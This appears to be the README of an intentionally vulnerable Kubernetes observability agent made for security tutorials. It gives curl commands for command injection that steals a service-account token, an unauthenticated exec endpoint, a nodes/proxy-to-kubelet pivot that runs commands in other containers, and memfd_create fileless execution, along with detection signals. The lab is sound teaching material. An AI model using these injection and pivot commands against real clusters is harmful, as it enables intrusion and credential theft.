# Ooopservability

**Intentionally vulnerable observability agent for Kubernetes security tutorials.**

> ⚠️  Do **not** deploy this in a production or shared cluster. It contains deliberate unauthenticated RCE and fileless execution capabilities.

---

## What is this?

Ooopservability is a fake observability DaemonSet that demonstrates a common and underappreciated attack chain in Kubernetes:

```
Over-permissive RBAC (nodes/proxy GET)
  └─► Attacker exploits RCE in the agent pod
       └─► Reads the mounted SA token
            └─► Uses token + nodes/proxy to reach the kubelet API
                 └─► Executes commands in any container on the node
```

The service looks like a legitimate metrics/log scraper. It is not.

---

## Attack Tracks

### Track 1 — Basic: Command Injection → RCE

The log search endpoint passes user input directly to `sh -c`:

```bash
# Innocent search
curl 'http://agent:8080/api/v1/logs/search?q=error'

# Command injection — exfiltrate SA token
curl 'http://agent:8080/api/v1/logs/search?q=x;+cat+/var/run/secrets/kubernetes.io/serviceaccount/token'

# Or use the explicit exec endpoint
curl -X POST http://agent:8080/api/v1/diagnostics/run \
     -H 'Content-Type: application/json' \
     -d '{"command":"id && hostname && cat /proc/1/environ"}'
```

### Track 2 — Intermediate: nodes/proxy Pivot

Once you have the SA token (from Track 1 or directly from the `/api/v1/nodes` endpoint):

```bash
TOKEN=$(curl -s -X POST http://agent:8080/api/v1/diagnostics/run \
             -H 'Content-Type: application/json' \
             -d '{"command":"cat /var/run/secrets/kubernetes.io/serviceaccount/token"}' \
        | jq -r .output)

NODE=$(curl -s http://agent:8080/api/v1/diagnostics/run \
            -X POST -H 'Content-Type: application/json' \
            -d '{"command":"echo $NODE_NAME"}' | jq -r .output | tr -d '\n')

# List every pod on the node via nodes/proxy → kubelet
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://kubernetes.default.svc/api/v1/nodes/${NODE}/proxy/pods" \
  | jq '.items[].metadata | {name, namespace}'

# Execute a command in any container on the node
curl -sk -H "Authorization: Bearer $TOKEN" -X POST \
  "https://kubernetes.default.svc/api/v1/nodes/${NODE}/proxy/run/kube-system/coredns-xxx/coredns" \
  -d 'cmd=cat /etc/resolv.conf'
```

**Why does this work?** The kubelet API (`/run`, `/exec`, `/pods`) is exposed through `nodes/proxy`. The kubelet trusts that the API server has already authorised the caller — so `GET nodes/proxy` effectively grants full kubelet access.

### Track 3 — Advanced: Fileless Execution via `memfd_create`

Build the demo payload:

```bash
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o payload ./payload
```

Upload and execute — the binary **never touches disk**:

```bash
curl -X POST http://agent:8080/api/v1/diagnostics/upload \
     --data-binary @payload \
     -H 'Content-Type: application/octet-stream'
```

**How it works:**
1. `memfd_create("kworker", 0)` — creates an anonymous RAM-backed file descriptor
2. ELF binary is written to the fd with `write(2)`
3. `execve("/proc/self/fd/N", ...)` — kernel resolves the path to the in-memory fd and executes it
4. No `open()`, `creat()`, or `write()` to any filesystem path — `ls /tmp`, `inotify`, and most EDR filesystem monitors see nothing

**Detection signals:**
| Tool | Signal |
|------|--------|
| Falco | `execve` where `fd.name` starts with `/proc/self/fd/` |
| Tetragon | `ProcessExec` where `binary.path` is empty or `memfd:` |
| auditd | `SYSCALL memfd_create` followed by `execve` of `/proc/*/fd/*` |
| eBPF (raw) | `sys_enter_execve` with pathname resolving to anonymous inode |

---

## Deploy

```bash
# Apply everything
kubectl apply -f manifests/namespace.yaml
kubectl apply -f manifests/rbac.yaml
kubectl apply -f manifests/daemonset.yaml

# Wait for rollout
kubectl rollout status daemonset/ooopservability-agent -n ooopservability

# Access the dashboard (port-forward)
kubectl port-forward -n ooopservability daemonset/ooopservability-agent 8080:8080
# → http://localhost:8080
```

## Tear Down

```bash
kubectl delete namespace ooopservability
kubectl delete clusterrole ooopservability-agent
kubectl delete clusterrolebinding ooopservability-agent
```

---

## Vulnerability Summary

| Endpoint | Vuln Class | Track |
|----------|-----------|-------|
| `GET /api/v1/logs/search?q=` | Command injection / RCE | Basic |
| `POST /api/v1/diagnostics/run` | Unauthenticated RCE | Basic |
| `GET /debug/pprof/` | Exposed pprof — heap/goroutine dump | Basic |
| `GET /api/v1/nodes` | Sensitive data via kubelet proxy | Intermediate |
| `POST /api/v1/diagnostics/upload` | Fileless execution via `memfd_create` | Advanced |
| TLS skip verify | MITM on K8s API connection | Basic |

---

## Project Structure

```
.
├── main.go              — HTTP server, routes, embedded dashboard
├── handlers.go          — Vulnerable HTTP handlers
├── kubelet.go           — Kubelet API client (nodes/proxy)
├── httpclient.go        — Shared HTTP client (insecure TLS)
├── exec_helper.go       — exec.Cmd helper
├── fileless_linux.go    — memfd_create fileless exec (Linux)
├── fileless_stub.go     — Non-Linux stub
├── static/index.html    — Dashboard UI
├── payload/main.go      — Demo payload binary (harmless)
├── manifests/
│   ├── daemonset.yaml
│   └── rbac.yaml        — ClusterRole with nodes/proxy GET
└── Dockerfile
```
